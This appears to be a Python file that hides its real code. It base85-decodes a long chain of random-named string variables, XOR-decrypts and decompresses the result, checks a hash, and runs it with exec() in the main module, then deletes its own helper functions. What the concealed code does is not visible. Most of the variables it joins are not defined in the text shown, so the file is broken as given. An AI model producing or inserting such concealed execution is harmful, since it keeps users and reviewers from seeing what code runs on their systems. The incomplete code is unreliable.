_cdnCK7amNj5DNl = '##Zwm0T>6=cWM?;Xz~!%9vl0zZdfXfiutdx3h>l_'
_cwITawQlKXMvB0 = 'KxbF!dDoUY;`lm#TfWC$-FH;!QOeI(2*Rj=pJKS0'
_cgeOY_hlnOXyD5 = 'DSp9IsEDdTPXf-XobNKKHErcJzZBL0et}<VkE)Gt'
_ca4LIAfOgJjdnj = 'q3KcE*L{`{XtBiW5K0^$!!U&pHYJ0Ujp-1P&)`|v'
_cxRsrNNhr8APtp = 'W7n1jsu2%TM<kDy6>n5&RxDJvez^*+Wg~ce{_R~?'
_c_YxT5geaiFIt0 = 'ob$JJV3hpTB5sHXSdg(42$U7q=+UZ~#DK&wkmPSb'
_ckoRvwsMxIp80_ = '@K5qBoa{z;hKUrBbq%8Crcdo<HeB@#OeV*ZzJoFP'
_czm0SouArxJbWO = 'JJkSU5E9_XH@-Kg3&md;mU7qS0|!PMn;*<dfV42r'
_ckisBveoubbo_B = 'Ub=3U{3x^~L9HdWp>-;ROr6xf<U_hmCMr-d#_Q6n'
_crpelDvzGSoUQ1 = 'mspx#(_4nHC|8gfa%25KAU-lJifLbdA<#Q%XW_m$'
_csD2RIXxw2HZuk = 'G*QozM!#TX%aQ)}a6I@Ac9@Wufqn$1#dRk2rDgZ|'
_cvz8QcfABpHIXg = 'D2M?g3z@QBSy!tz5j9+IlxDlj6p6Odb(xk}^UHNd'
_cwAWG0NyliXulI = 'ljVvkjb@gaQ-!xcj5f;lPOll3*^_~q^|fo#2_t9M'
_cvPbFfwYjK1U9J = 'vhO~(McmEy2hbMXTc$)~VWq!OWQYzM_YWwcxPJ)&'
_csvmCi0Fg8i0rT = 'WLHZ~U@E)emrSa48sfzZcV^M0CdE)JYvJhT0|h#*'
_ck7oBFA_RIdhJw = 'Org&Zq~we@cX@wwP$2lhPE)=nZF^%K`-Dg_>2a$V'
_c_EHoeqq6yub_3 = 'aI8i>s<PfC>2bdng*Li0>o!+XQ30v{)#P|L%=OVd'
_cykNZvpADSnDrc = 'YCCc}lI4WwEv@rfG-EX5O|h|=_7WX~hB+sP@~>q|'
_cjvDOYTemunaV_ = '@Pffymp3avcj`fh771B1d19d2TxiepQN;VGY`Db8'
_ceZ5UqexX4HDSB = 'pu}V(by0Md;ZQ%RV+ofguu}Is#lyD6Ls@Z{^t85N'
_cyM035sB_KcsM4 = '8bh42?qa!x7a#+jU)5sw6#cvfbkGR{$&(k;?5+ZN'
_cm9QiqstaekrYG = 'SIWX?;Q_tBC^P7n%=bIf*{>cDZl4kA6IxlczNTi-'
_cxSasH4KVdsDCn = '9MgN{$qDBA`1^7n@KJzPXDufmmM_FP`sHgItofAB'
_cn02LsARFHkfiQ = 'kaoMhA!-Wy8?-UNt9rATJx{6wf2Y%(Tgp!6$N$go'
_cgTZ3vKfEptFBZ = 'gVI@f#c^m>7tzYX2x!8~MntHI%}`(8#vz=g@jS)f'
_cvLUw9ZXwgxUw_ = 'Q+g`n|C~(^z+h)<;x3ovyq;1GCBhTWU@)c66o>Mq'
_cmBC8Vc1pVGwLy = 'dIMO)*J<il6C)c!!_~IH_TUb2l1}PShC=ThI&q{H'
_cgYyoPhpvgFfLL = 'G#G9GE!Hd;@NxcKy7R(N?C9;ZNrv)L=l}(ec#*P&'
_cauZvH0WqPAPpu = '&Lmo<cko=-359)OR_;htTpKPE1#|D-de~}F$I2x8'
_cw7gjCkvMyvFui = 'qd3-RjLvBWR|PE*$5tJZmh{FZ_QOn&n5gxs^wuMD'
_chDaHJOPoBlMeB = 'I9}W0X>57BY9O2i;Ce5xkc}kTu|cayfmoU!8QFJs'
_chtsHml6SMOhUd = 'yqY*3mBhEV;OjaTO*7)1HS@lVS(_ik`dA3Xhn=k<'
_ct6Mi60XdbgKU5 = 'mcUyZ`R(O246T}E_--{J+9X8BcE5mqv2?wP*LLg@'
_ccoUSi1kvAc5ef = 'd*5V|+Q#5FJwHTNJieFPLlX7(0nN|Pt9x5qP-KIR'
_cylfyRPUnCfkl0 = 'EYfCaxK^NRD1i#<BUZ5g+GCsAkmgh@K#8wa#Q'

_pj0_6D3Yd9M2HT = __import__('base64').b85decode(_ccJkU75gSf3Sr9 + _chanJKCaYN3uw6 + _cziKRlRijkmd8v + _cbaQTQY8MZvVQ2 + _cqIqhHa4CogjYW + _cenl9QsSYu8QiS + _cnJ_B9OxwXqYw2 + _cbEtxtWa28ST7T + _ckn8n4DKBQq8AP + _ctSvU7gtvUn6fF + _caoiqG6j7lXJ_1 + _clXMvdwuuH3GsL + _cnOOOIln9DEoOg + _cqKPN2JlB1M4Qm + _cg_nuA0v6EUJbf + _crcQiFQx80LUFt + _cvDPjE3pH1JKPK + _cojehea8NIsrrF + _cikKZizvMOB6KR + _cnw5wiS1QGuXEb + _cvQOSBGOga_X4v + _cnZdc1Xs9LMBK9 + _cnBMlBjspNceJf + _ccLGYbZXcDcMFo + _cz8_sdjqcZ6JmV + _ck41bxGkZyhyhw + _cy9JR_Luu_n6En + _cs33cxJj0os5OJ + _cqrwDBgG2VrDIx + _clLIXMyGnGqwwK + _cnW7FM3x7oQ5gT + _cy6mhf_kXfEXYs + _co0VsOOTIvJh_I + _czhy_YYqaWynHw + _ctzSSahh5NLa6r + _coPeCzyOIYDosA + _cnDaFnSO2UM1V6 + _cq_ncMsEfeQxEU + _czLhuD6LBoaB6B + _ctDcxJvTSdwwiI + _csqhFOWhZyHjIu + _cl5OB2nWlsfYVx + _ckoVnf968h1DKO + _ckqHX9V6SJaK2Y + _csMfTX0OrxV4Vr + _cloSqBSYCFUJbK + _ceeL0GRmsDVQti + _cpFzfClNTovfbP + _cozOarL3MImlDa + _cwRyi6QaJdXpji + _chSUFlHfkYq_lR + _cyRQ0Lch9pHQBv + _ctaWZKlflyQwp9 + _cc6P0j8x6yldFD + _cyiwSvrwH1kulh + _cqDh5VLigqisHz + _cpdt41AntDp6Wi + _coIeHEjMvnE6un + _czz9BYpM4lkR4U + _ccvWeSRYWb9SYY + _cgeXhmH14x7LoS + _c_lr54_i5g2niz + _cgtqm8fiKODluD + _cpgj3Mga7R7hGT + _corqDjFHHOonfu + _chrQ5m1Rm6eEHi + _cqZooVoXd1B_5e + _cm7XPubnftKOis + _csFlLrpkLHK9XK + _cpFtZUFledEZYP + _clZ5rJOXhlpOHe + _cuGAyGKV7lPEMq + _cxqSIZfyTByh8Y + _ckLS22eSXCGYqO + _ca3m7WGilmRMNy + _cbOffNq30eBmCj + _cyD2Qgy8hA5HtC + _cqGwTiUQIjWj7r + _cdH12QPfPG1m_d + _cs2srX3ZR4FZIQ + _cm8eBg1CYmoBwK + _cjeTXiaLkbozkm + _ceHMGRMClF1JnM + _ck4UbC8KuNlgQV + _ciiKAFDMmYloX9 + _cjt8iFT1hbNBSX + _cyPC8PWKhvb79t + _cqhNGSkNnyIzxq + _cwG56nwSI60rQh + _czH51PeLKo5eTo + _cdFtzILipG5TaA + _ck112Mqe9UBUx6 + _c_6h9YODStiHr9 + _cq9nqZuIrvmj9h + _clO71EFgqJRIfc + _csOihWDIVDHTFG + _coSlJfaBCi8w2j + _cgRYu2cMjLBuNT + _cdi2p2kVFKQC1c + _cuPv6raohfasd8 + _cjy2LO7dkZ5Vw1 + _c__YYdf9b3GPHk + _cvqWWLprjulLkr + _cz9hXd7hdIjsM0 + _chKgMdNITnwyBN + _cwlUbIaUXpCb2j + _clUllt2h9PlQ0w + _cdXcUHg1IqvN5D + _cn3SlM1d6jQ9AX + _cx4qmNRk8rOpxe + _cbgWD0TILdiSQM + _chvaQ_JL8uz07u + _cooGSwjJPxrjUJ + _cfRqHDZHySg1BA + _clVkgoxcNoG_8T + _cw69LSMRg1MH_i + _cbRncqj4GATsUq + _cpABdcAFpj5hQE + _csQRYuvu162CDN + _cxGGE_Uu1s9U9N + _chY8SBRtY6yiZy + _cs9tXjbkxnb0Ut + _caAo7DJ6VUBRUm + _cnPJJvdG1Js8rA + _csra8vwNlEZPG2 + _cxCu9T3bQlhWZU + _cr74YKq8m5aOQp + _ckpA4EXrlikRRe + _cxCAX6OiEkfbSf + _cf2UJqul2sQKqr + _cosBkEg1ZYvCRt + _ciD5EGfyodWok1 + _clUgABtE3sbqqk + _cpMUQHmc2YhGS3 + _cu8HsP2G_SwmM1 + _cwIKfl8n1GjzkE + _cirO9zNLlIqE_x + _ciusOTqD3Ob_xW + _co60eWEPyFLGhm + _cpdrIHWobLnTaq + _cw3DQiuKtySYgY + _chsy7Hpnbo99Rk + _cz8H_VcSDlsel7 + _crOk2FqlO4VTof + _cwW6vDmvPqIwxN + _cyz1rEO1TtP2rU + _czIgk5S5MqrQpY + _crsuBuBEFfq_pw + _cjXLA5RFm8JD6F + _cjAVJ3PLYk_Oi3 + _cz0YJ1NgFQrU4R + _cxBag7ugMYxVAf + _ckaWnkAK9kcZeD + _cyhQCD0qux1L05 + _cp7VjekHo24ZdG + _chC5Z0wSMSuysE + _cfBaumifxJO9oQ + _ce1EWCVEMT4WcX + _cfI7toZmAvihU1 + _cruRJMb0qU1KfD + _cgZmPXEjX3wuXJ + _csp6Dr_5bgkGz9 + _cjUZ8TlHbMhgQM + _cw7FRYe1smNkEx + _csozJQ9MdpZqAD + _cbnQywVAIATLow + _cvEjtA9MQj3Cna + _cgtgl3bkOXYY5E + _cxvFu41HIsWoRr + _czDuYGSNvUNH9_ + _cg0IOFASVzd45j + _cleo89F17I_RoI + _ckbkSv6vDIgoai + _ceCVIgPhxoY1Pd + _cyuHkXkCGuJpRw + _caDcwH9ZoPkoIl + _ch1URPzzV0Sy2H + _ckI8tzRkenPc23 + _crBKRyO6PklXj7 + _ckTrvMYbwjYEo8 + _csKe8YkVBE7HNp + _ck2SpGqhdXBWKs + _cd4bBWNg1OXU5L + _cyFWu9__GNV7KS + _cv5vcyzt4S400F + _cwDfVwwYTtehCR + _cf3Rukp9KhSDuy + _cwPPE8sUgk5t7F + _ckTVDZxUHqi0n5 + _cmQF_Tl7xXeMei + _caUXyVR3y1UYih + _cs1AA7ml7E7Rd0 + _cyP4DcRKYVMuFf + _cfglDOV6IvxuyV + _ckdhOK_yXQ6pj8 + _ct_9c7a8FYsXzX + _cirUtXANgRw_nt + _cesvSsokREyUTe + _czXj3CYCJA6DLd + _coJh32CU5OMFQl + _chSD6NRjSFWu8z + _coYrMercqHYVTR + _cbw0OOkRMuOju3 + _cy6ORUQg4BhwfV + _cwtVGY5ppsfijh + _cg1GFUKGBZy2Zg + _c_Ruh7QIXP7v5J + _ce754amoCA3E9j + _ciR7JjJ3uUWVGZ + _csRmuV6bs3aZyE + _cfAfohIv2F6rru + _chWtHrhhW8PHLR + _cj6fi0Pya0DNwe + _cypEkZrfv0aRs5 + _cuHiNFwNQ_uxGk + _ciQM_3GhEh3oMy + _ceEVWAVyHQZwgL + _crHkuklM9jwQeA + _cjHFvfvm9Z1TRA + _cqPSAdww5p5P1T + _ctCsEodqV5lsTW + _cbw_5qZ8SfddNJ + _cmsIKAKQ4tDNmM + _ciKtNXU8GiQOCW + _ccG4PYXlSg63uL + _ccGndRGFc_ztSS + _cjow6E2JiGbUu9 + _cwqWb6UKWNTMS9 + _cs3RHZY7EiaAi1 + _ccWPSnK6JE9wzG + _cfj67TWLdmGFkS + _ccTVMqntE1hjtG + _czsTJKKGsyx2FO + _czqpzxMYQ34LDg + _ceOTyr6FqCRrET + _ce5dZHLJn84MHq + _cctwESrh32yrOe + _caZP7USRsPH_PS + _cl1jKL4gN0fzqn + _cnGWaYncekeGhV + _cywzaDSGaxlE85 + _clVmKCVeKtV_es + _c_5O6pNCQnS1RH + _ctNEhT3IhzORbf + _cdnCK7amNj5DNl + _cwITawQlKXMvB0 + _cgeOY_hlnOXyD5 + _ca4LIAfOgJjdnj + _cxRsrNNhr8APtp + _c_YxT5geaiFIt0 + _ckoRvwsMxIp80_ + _czm0SouArxJbWO + _ckisBveoubbo_B + _crpelDvzGSoUQ1 + _csD2RIXxw2HZuk + _cvz8QcfABpHIXg + _cwAWG0NyliXulI + _cvPbFfwYjK1U9J + _csvmCi0Fg8i0rT + _ck7oBFA_RIdhJw + _c_EHoeqq6yub_3 + _cykNZvpADSnDrc + _cjvDOYTemunaV_ + _ceZ5UqexX4HDSB + _cyM035sB_KcsM4 + _cm9QiqstaekrYG + _cxSasH4KVdsDCn + _cn02LsARFHkfiQ + _cgTZ3vKfEptFBZ + _cvLUw9ZXwgxUw_ + _cmBC8Vc1pVGwLy + _cgYyoPhpvgFfLL + _cauZvH0WqPAPpu + _cw7gjCkvMyvFui + _chDaHJOPoBlMeB + _chtsHml6SMOhUd + _ct6Mi60XdbgKU5 + _ccoUSi1kvAc5ef + _cylfyRPUnCfkl0)
if __import__('hashlib').sha256(_pj0_6D3Yd9M2HT).hexdigest() != '82772760fc9fe914f3fa8bfe247ea0abf397ef1a4d85d01bd2e2f8d73154fd96':
    __import__('sys').exit(1)
_xdV39aTI0fdKOq = bytes([105, 45, 148, 167, 4, 26, 222, 46, 205, 88, 144, 133, 111, 229, 47, 159, 72, 201, 208, 63, 73, 130, 83])
_fkvz16iGnExkYhL = bytes([64, 142, 26, 212, 220, 138, 198, 202, 63, 220, 57, 113, 208, 122, 166, 0, 192, 103, 61, 211, 205, 231, 27])

def _fxqh09Ai77NnMCK(_boX3g7luUTCKv_, _krfKIv3IjxMnw_):
    return bytes(_boX3g7luUTCKv_[_ijmDDjK1dXzVxL] ^ _krfKIv3IjxMnw_[_ijmDDjK1dXzVxL % len(_krfKIv3IjxMnw_)] for _ijmDDjK1dXzVxL in range(len(_boX3g7luUTCKv_)))

def _fd_RivWXHC_X28K(_tp4YMY9J4cmFmd):
    import zlib
    return zlib.decompress(_tp4YMY9J4cmFmd) # Un seul niveau de zlib ici pour simplifier

def _fectiaTjE4IeTQw():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xbDrL6dKRu23n_ = _fxqh09Ai77NnMCK(_pj0_6D3Yd9M2HT, _xdV39aTI0fdKOq)
    # 2. Décompression Zlib
    _d_gFoz14iyoroU = _fd_RivWXHC_X28K(_xbDrL6dKRu23n_)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _d_gFoz14iyoroU.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _ngA1oOipMW_IzX = _main.__dict__
    _ngA1oOipMW_IzX.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _ngA1oOipMW_IzX)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_fectiaTjE4IeTQw()
try:
    del _fxqh09Ai77NnMCK, _fd_RivWXHC_X28K, _fectiaTjE4IeTQw
    del _pj0_6D3Yd9M2HT, _xdV39aTI0fdKOq, _fkvz16iGnExkYhL
except:
    pass
